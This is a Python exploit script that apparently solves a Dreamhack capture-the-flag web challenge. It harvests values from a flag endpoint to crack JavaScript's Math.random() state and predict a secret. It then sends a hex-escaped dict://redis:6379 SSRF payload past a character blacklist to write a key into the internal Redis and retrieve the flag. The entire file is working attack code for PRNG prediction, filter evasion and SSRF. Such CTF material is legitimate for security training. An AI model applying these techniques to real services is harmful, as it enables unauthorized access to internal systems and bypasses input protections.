import requests
from cracker import *

url = "http://host3.dreamhack.games:23189/"
s = requests.Session()

# predict rand
PIE = 314159265
solver = RandomSolver()

n = 80

for i in range(n):
    res = s.get(f'{url}/flag?key=1')

    key = int(res.text[res.text.index('>') + 1:])
    solver.submit_random_mul_const(key, PIE)

    print(f"Leaked: {key:<10} | {i + 1}/{n}")

print("> Cracking Math.random()")
solver.solve()
gen = solver.answers[0]

secret = int(gen.random() * PIE)
print("Found secret:", secret)

# redis ssrf
def obf(s):
    blacklist = '%_@!><~*'

    for banned in blacklist:
        s = s.replace(banned, f'\\x{banned.encode().hex()}')

    return s

key = f'itz_super@key!!>{secret}'
payload = f'dict://redis:6379/SET:"{key}":99'

res = s.post(f"{url}/handshake", data={
    "url": obf(payload)
})

if "forbidden" not in res.text.lower():
    print("> SSRF succeeded")

# get flag
res = s.get(f"{url}/flag?key={key}")
print("Flag:", res.text)